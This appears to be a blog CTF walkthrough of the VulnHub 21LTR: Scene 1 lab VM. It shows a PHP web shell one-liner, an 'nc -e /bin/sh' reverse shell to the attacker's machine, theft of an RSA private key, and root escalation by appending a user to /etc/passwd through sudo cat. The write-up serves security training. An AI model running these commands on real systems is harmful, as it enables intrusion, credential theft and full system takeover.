@@ -1,0 +1,89 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">Hack the 21LTR: Scene 1 VM (Boot to Root)</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-21ltr-scene-1-vm-boot-to-root/" rel="bookmark"><time class="entry-date published" datetime="2016-08-02T17:37:15+00:00">August 2, 2016</time><time class="updated" datetime="2025-06-10T20:13:12+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">21LTR VM is a Boot to Root Challenge based on a scene that there is a penetration testing company and it has hired the players to perform the test on a client company’s internal network. We are given that the Target Machine has a static IP Address. You can download it from here: https://www.vulnhub.com/entry/21ltr-scene-1,3/</span></p>
+<h3><span style="color: #800000;">Penetrating Methodologies:</span></h3>
+<ul>
+<li><span style="color: #000000;">Network Scanning (Nmap, Netdiscover)</span></li>
+<li><span style="color: #000000;">Examining HTTP web page</span></li>
+<li><span style="color: #000000;">FTP Login for log.php file</span></li>
+<li><span style="color: #000000;">Use PHP web shell one-liner</span></li>
+<li><span style="color: #000000;">Insert netcat reverse_shell payload</span></li>
+<li><span style="color: #000000;">Spawn TTY shell</span></li>
+<li><span style="color: #000000;">Editing passwd file for Privilege escalation</span></li>
+<li><span style="color: #000000;">Get Root access</span></li>
+</ul>
+<p><span style="color: #000000;">Let’s Begin</span></p>
+<p><span style="color: #000000;">Target Machine’s IP Address: 192.168.2.120</span></p>
+<p><span style="color: #000000;">Our first step towards penetration testing is scanning our target with NMAP.</span></p>
+<pre class="lang:default decode:true">nmap 192.168.2.120</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-cr_yHTBtaxo/W2M-TADvmeI/AAAAAAAAZGg/41SvJvZUUl0bk1SzWCUmWLw4W6gkzM34QCEwYBhgL/s1600/1.png"/></span></p>
+<p><span style="color: #000000;">The result showed us that there are 4 ports opened: 21(FTP), 22(ssh), 80(HTTP), 10001(scp-config).</span></p>
+<p><span style="color: #000000;">To further explore and we browsed URL on port 80 and we greeted with a C Program featuring a loop as shown in the given image.</span></p>
+<pre class="lang:default decode:true">http://192.168.2.120</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-SVFHoOFI8Gs/W2M-VN_BczI/AAAAAAAAZGU/8A3Wk_XZjb0OBodD772nVpC9k0MSo3JKQCEwYBhgL/s1600/2.png"/></span></p>
+<p><span style="color: #000000;">After this, we thought to check it’s the source code which leads us to some Login Credentials.</span></p>
+<pre class="lang:default decode:true">Username: logs
+Password: zg]E-b0]+8:(58G</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-YcHWzITZJ_o/W2M-VZ57xNI/AAAAAAAAZGY/SMaWDPbC-TEHsjXvTH0vI5SUIWHOEH5pwCEwYBhgL/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">So, we tried to connect with FTP through the login credentials we found. After the successful login, we looked around to find a <strong>backup_log.php</strong> file which we downloaded to our local machine to have a closer look.</span></p>
+<pre class="lang:default decode:true">ftp 192.168.2.120</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-POKiKN2iq-4/W2M-Vqt8AbI/AAAAAAAAZGg/pfRAGnrJfoA1gC8Bp_UnXWdDaTkZ1EPLgCEwYBhgL/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">After Downloading the file to our local system, we used the cat command to open the file in our terminal as you can see that it contains a PHP program that is used to generate backup logs on the target system.</span></p>
+<pre class="lang:default decode:true">cat backup_log.php</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-srhRpXVX7M4/W2M-Vtob2VI/AAAAAAAAZGo/SEL_jE1a7uAhOg4XDG5QtoHTUgRI9rh1ACEwYBhgL/s1600/5.png"/></span></p>
+<p><span style="color: #000000;">Let’s see what we can find by directory brute forcing.</span></p>
+<pre class="lang:default decode:true">dirb http://192.168.2.120</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-Lp2Fma9sHts/W2M-WAor-fI/AAAAAAAAZGo/33kAqjhZRQ4D2vnyDF0cSFNhrzoC8WiswCEwYBhgL/s1600/6.png"/></span></p>
+<p><span style="color: #000000;">It got us some directories but /logs looks more interesting so Let’s browse http://192.168.2.120/logs/</span></p>
+<p><span style="color: #000000;">But as you can see in the image given below is that the logs directory is forbidden to access.</span></p>
+<p><span style="color: #000000;">We tried to run some commands but didn’t get much success here.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-X3UnMtgPCis/W2M-WsRrk2I/AAAAAAAAZGc/VV55l6mu2GEqSnDwazLenBQbRk9I4_OXwCEwYBhgL/s1600/7.png"/></span></p>
+<p><span style="color: #000000;">This is where we got a bit stuck so after some internet searching hours we got in touch with the author of the lab and after his hint, we got that we have to further tweak the 10001 port.</span></p>
+<pre class="lang:default decode:true">nc -nv 192.168.2.120 10001</pre>
+<p><span style="color: #000000;">We started a netcat session on the port 10001, we got a blank shell, which uses a PHP one-liner web shell</span></p>
+<pre class="lang:default decode:true">&lt;?php system($_GET['cmd']) ?&gt;</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-4U4SaF3DS14/W2M-WrJeESI/AAAAAAAAZGk/V4T8rAU8fI08wsfE9_yimVG26p3zWnLcACEwYBhgL/s1600/8.png"/></span></p>
+<p><span style="color: #000000;">Now after using that PHP one-liner, let’s see if we can run some commands. We tried to run the whoami command. It replied with apache. This proves that we can run commands from here.</span></p>
+<pre class="lang:default decode:true">http://192.168.2.120/logs/backup_login.php?cmd=whoami</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-TbPf6tROPmU/W2M-W-EsQtI/AAAAAAAAZGg/KgY86ZB42PYYQjrYapwJ0d6Ss9E73QDaQCEwYBhgL/s1600/9.png"/></span></p>
+<p><span style="color: #000000;">As we observed above that the commands run successfully, now we will try to get a reverse shell on our local machine using netcat. We will be doing this as shown in the image.</span></p>
+<pre class="lang:default decode:true">http://192.168.2.120/logs/backup_login.php?cmd=nc -e /bin/sh 192.168.2.12 443</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-JOmy__6o8ao/W2M-TVo13tI/AAAAAAAAZGY/nkWOskxx7TQ1hHQSGpiaU4vp770yX9kEACEwYBhgL/s1600/10.png"/></span></p>
+<p><span style="color: #000000;">Meanwhile, we ran that command we also started a netcat listener on our local machine so as to get the shell which will be generated.</span></p>
+<pre class="lang:default decode:true">nc -lvp 443</pre>
+<p><span style="color: #000000;">And as you can see that we got a basic bash shell on port 443 as shown in the image.</span></p>
+<p><span style="color: #000000;">But this was an incomplete and improper shell so we invoked a proper shell using a python one-liner</span></p>
+<pre class="lang:default decode:true">python -c 'import pty; pty.spawn("/bin/sh")'</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-EkfwJ-iOxAc/W2M-TUxKOGI/AAAAAAAAZGk/M7P6Cwh0WZs9rGLaNy9lzH-ORuNmIBhhACEwYBhgL/s1600/11.png"/></strong></span></p>
+<p><span style="color: #000000;">Now, we are in the target machine but still, we have to escalate the privilege to become root. Here we started to enumerate the target machine for any possible way to get root.</span></p>
+<p><span style="color: #000000;">After looking for a while we found an RSA private key in the media directory. We copied the key to our local machine.</span></p>
+<pre class="lang:default decode:true">cat id_rsa</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ylx00uy3pvA/W2M-UCSHIQI/AAAAAAAAZGg/sRcH83EnWYANPDgpfQNMwiaItHTsC5XhgCEwYBhgL/s1600/12.png"/></span></p>
+<p><span style="color: #000000;">Now we navigated to the user “<em>passwd file”</em> to get the info about the username that we can use for getting the ssh session. We found <strong>hbeale</strong>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-kK8Dna1MGX8/W2M-UZqkOZI/AAAAAAAAZGg/oboAvSlJBYEezZnU7MtlqprgodgjUQaUwCEwYBhgL/s1600/13.png"/></span></p>
+<p><span style="color: #000000;">Now the RSA Private we copied, we saved it as id_rsa and change its permission using the chmod command so that it can act as the ssh private key.</span></p>
+<pre class="lang:default decode:true">chmod 600 id_rsa</pre>
+<p><span style="color: #000000;">After this, we tried to connect to the target machine using ssh by user hbeale and the private key.</span></p>
+<pre class="lang:default decode:true">ssh -i id_rsa hbeale@192.168.2.120</pre>
+<p><span style="color: #000000;">And as you can see in the image given that we successfully got the shell of user <strong>hbeale. </strong>But as this is a boot to root challenge we have escalated this shell into a root shell.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-AWBmNr-gtjk/W2M-UV2vJvI/AAAAAAAAZGc/B6kyJhBpSwg6TNgzI6iRNTb3NWOG1sKJgCEwYBhgL/s1600/14.png"/></span></p>
+<p><span style="color: #000000;">We used the <strong>sudo -l</strong> command to extract the information about the command that can be run as root. We found out that we can run <strong>cat </strong>command.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-pr4R39JqhJY/W2M-UiPRqXI/AAAAAAAAZGo/j2EB9Tbxg64nMJ7U2h7yTzh3xdGZI_lEACEwYBhgL/s1600/15.png"/></span></p>
+<p><span style="color: #000000;">Now back to our local machine, here we will use the OpenSSL command to create a password salt for our new user that we will use to log into the target machine.</span></p>
+<pre class="lang:default decode:true ">openssl passwd -1 -salt user3 pass123</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ztgsvxgLc2A/W2M-U4rQ3RI/AAAAAAAAZGQ/RU5Z6zO8SB0BCzcS3sc6DrHsrNqI-mwhwCEwYBhgL/s1600/16.1.png"/></span></p>
+<p><span style="color: #000000;">On the Target machine, we use the cat command to edit the <em>/etc/passwd</em> file with the login credentials of the user we meant to create (which is going to have the root privileges).</span></p>
+<pre class="lang:default decode:true">sudo /usr/bin/cat &gt;&gt; /etc/passwd</pre>
+<p>After successfully edit the /etc/passwd file, we will substitute the new user we created using the <strong>su</strong> command. <span style="color: #000000;">After entering the password which we created earlier, we login to the root shell. </span></p>
+<p><span style="color: #000000;">This concludes this Boot to Root Challenge.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-j30A5UGqthg/W2M-VFJzUTI/AAAAAAAAZGg/YdiGlmyFY6YWDa9oKLNuDLfOtWqgD0xaACEwYBhgL/s1600/16.png"/></span></p>
+<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher and Penetration Tester Contact <strong><a style="color: #000000;" href="https://www.linkedin.com/in/pavandeep-singh-6b1074132">here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
